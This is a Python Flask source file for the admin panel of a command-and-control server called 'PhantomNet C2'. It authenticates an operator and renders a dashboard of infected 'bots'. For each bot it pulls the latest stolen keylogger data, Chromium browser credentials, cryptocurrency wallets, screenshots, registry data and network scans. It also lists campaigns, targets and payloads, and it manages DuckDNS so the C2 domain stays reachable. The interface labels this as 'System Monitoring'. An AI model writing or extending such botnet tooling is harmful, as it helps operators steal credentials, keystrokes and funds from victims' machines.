"""
Admin routes for PhantomNet C2 Server
"""

from flask import Blueprint, render_template, request, redirect, url_for, session, flash, jsonify
from werkzeug.security import check_password_hash
from datetime import datetime

from ..models import (
    db, Admin, Bot, Command, SystemInfo, NetworkScan, ProcessList, FileSystem,
    RegistryData, Screenshot, KeyloggerData, ChromiumCredentials, CryptoWallet,
    DuckDNSUpdater, Target, Campaign, Payload, Task
)
from ..server import PhantomC2Server

admin_bp = Blueprint('admin', __name__)

# Global server instance (would be injected in production)
server = PhantomC2Server()

@admin_bp.route('/')
def index():
    """Main index route"""
    if 'admin_logged_in' in session:
        return redirect(url_for('admin.admin_dashboard'))
    return redirect(url_for('admin.admin_login'))

@admin_bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        admin = Admin.query.filter_by(username=username).first()
        if admin and check_password_hash(admin.password_hash, password):
            session['admin_logged_in'] = True
            session['admin_id'] = admin.id
            return redirect(url_for('admin.admin_dashboard'))
        else:
            flash('Invalid credentials', 'error')

    return render_template('admin/login.html')

@admin_bp.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard"""
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin.admin_login'))

    # Get statistics
    total_bots = Bot.query.count()
    active_bots = Bot.query.filter_by(status='active').count()
    recent_commands = Command.query.order_by(Command.timestamp.desc()).limit(10).all()
    total_targets = Target.query.count()
    total_campaigns = Campaign.query.count()
    total_payloads = Payload.query.count()
    total_tasks = Task.query.count()
    completed_tasks = Task.query.filter_by(status='completed').count()
    failed_tasks = Task.query.filter_by(status='failed').count()

    # Get all bots for the dashboard
    bots = Bot.query.order_by(Bot.last_seen.desc()).all()

    # Get latest data for each bot
    bot_data = {}
    for bot in bots:
        system_info = SystemInfo.query.filter_by(bot_id=bot.id).order_by(SystemInfo.timestamp.desc()).first()
        network_scan = NetworkScan.query.filter_by(bot_id=bot.id).order_by(NetworkScan.timestamp.desc()).first()
        process_list = ProcessList.query.filter_by(bot_id=bot.id).order_by(ProcessList.timestamp.desc()).first()
        file_system = FileSystem.query.filter_by(bot_id=bot.id).order_by(FileSystem.timestamp.desc()).first()
        registry_data = RegistryData.query.filter_by(bot_id=bot.id).order_by(RegistryData.timestamp.desc()).first()
        screenshots = Screenshot.query.filter_by(bot_id=bot.id).order_by(Screenshot.timestamp.desc()).limit(5).all()
        keylogger_data = KeyloggerData.query.filter_by(bot_id=bot.id).order_by(KeyloggerData.timestamp.desc()).limit(5).all()
        chromium_credentials = ChromiumCredentials.query.filter_by(bot_id=bot.id).order_by(ChromiumCredentials.timestamp.desc()).limit(5).all()
        crypto_wallets = CryptoWallet.query.filter_by(bot_id=bot.id).order_by(CryptoWallet.timestamp.desc()).limit(5).all()

        bot_data[bot.id] = {
            'system_info': system_info,
            'network_scan': network_scan,
            'process_list': process_list,
            'file_system': file_system,
            'registry_data': registry_data,
            'screenshots': screenshots,
            'keylogger_data': keylogger_data,
            'chromium_credentials': chromium_credentials,
            'crypto_wallets': crypto_wallets
        }

    # DuckDNS configuration
    duckdns_config = DuckDNSUpdater.query.first()

    # Get advanced C2 data
    targets = Target.query.order_by(Target.discovered_at.desc()).limit(10).all()
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).limit(5).all()
    payloads = Payload.query.order_by(Payload.created_at.desc()).limit(5).all()
    recent_tasks = Task.query.order_by(Task.created_at.desc()).limit(10).all()

    # Generate comprehensive HTML dashboard (simplified version)
    html = generate_dashboard_html(
        total_bots, active_bots, recent_commands, total_targets, total_campaigns,
        total_payloads, bots, bot_data, duckdns_config, targets, campaigns,
        payloads, recent_tasks
    )

    return html

@admin_bp.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.pop('admin_logged_in', None)
    session.pop('admin_id', None)
    flash('You have been logged out.', 'info')
    return redirect(url_for('admin.admin_login'))

@admin_bp.route('/admin/duckdns/update', methods=['POST'])
def update_duckdns():
    """Update DuckDNS"""
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin.admin_login'))

    success = server.update_duckdns()
    flash('DuckDNS updated successfully!' if success else 'Failed to update DuckDNS.', 'success' if success else 'error')
    return redirect(url_for('admin.admin_dashboard'))

@admin_bp.route('/admin/duckdns/toggle', methods=['POST'])
def toggle_duckdns():
    """Toggle DuckDNS"""
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin.admin_login'))

    duckdns = DuckDNSUpdater.query.first()
    if duckdns:
        duckdns.is_active = bool(int(request.form.get('is_active', '0')))
        db.session.commit()
        flash(f"DuckDNS {'enabled' if duckdns.is_active else 'disabled'} successfully.", 'success')

    return redirect(url_for('admin.admin_dashboard'))

def generate_dashboard_html(total_bots, active_bots, recent_commands, total_targets, total_campaigns,
                          total_payloads, bots, bot_data, duckdns_config, targets, campaigns,
                          payloads, recent_tasks):
    """Generate dashboard HTML (simplified version)"""
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PhantomNet Admin Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            .sidebar {{ min-height: 100vh; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }}
            .main-content {{ background: #f8f9fa; min-height: 100vh; }}
            .stat-card {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }}
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-3 sidebar p-4">
                    <h4 class="text-white mb-4">PhantomNet</h4>
                    <nav>
                        <a class="nav-link text-white" href="#dashboard">Dashboard</a>
                        <a class="nav-link text-white" href="#systems">Connected Systems</a>
                        <a class="nav-link text-white" href="/admin/logout">Logout</a>
                    </nav>
                </div>
                <div class="col-md-9 main-content p-4">
                    <h2>System Monitoring Dashboard</h2>
                    <div class="row mb-4">
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <h3>{total_bots}</h3>
                                    <p>Total Systems</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <h3>{active_bots}</h3>
                                    <p>Active Systems</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <h3>{total_targets}</h3>
                                    <p>Discovered Targets</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <h3>{total_campaigns}</h3>
                                    <p>Active Campaigns</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-6">
                            <h4>Connected Systems</h4>
                            {generate_bots_list(bots)}
                        </div>
                        <div class="col-md-6">
                            <h4>DuckDNS Configuration</h4>
                            {generate_duckdns_section(duckdns_config)}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
    </html>
    """

def generate_bots_list(bots):
    """Generate HTML for bots list"""
    if not bots:
        return "<p>No systems connected</p>"

    html = '<div class="list-group">'
    for bot in bots[:5]:  # Limit to 5 for dashboard
        status_class = "success" if bot.status == 'active' else "secondary"
        html += f'''
        <div class="list-group-item">
            <h6>{bot.hostname or bot.id}</h6>
            <small class="text-muted">IP: {bot.ip_address} | OS: {bot.os_info}</small>
            <span class="badge bg-{status_class} float-end">{bot.status.title()}</span>
        </div>
        '''
    html += '</div>'
    return html

def generate_duckdns_section(duckdns_config):
    """Generate DuckDNS configuration section"""
    if not duckdns_config:
        return '<div class="alert alert-warning">DuckDNS not configured</div>'

    status = "Active" if duckdns_config.is_active else "Inactive"
    status_class = "success" if duckdns_config.is_active else "secondary"

    return f'''
    <div class="card">
        <div class="card-body">
            <h6>DuckDNS Configuration</h6>
            <p><strong>Domain:</strong> {duckdns_config.domain}.duckdns.org</p>
            <p><strong>Status:</strong> <span class="badge bg-{status_class}">{status}</span></p>
            <form method="POST" action="/admin/duckdns/update" class="d-inline">
                <button type="submit" class="btn btn-primary btn-sm">Update Now</button>
            </form>
        </div>
    </div>
    '''
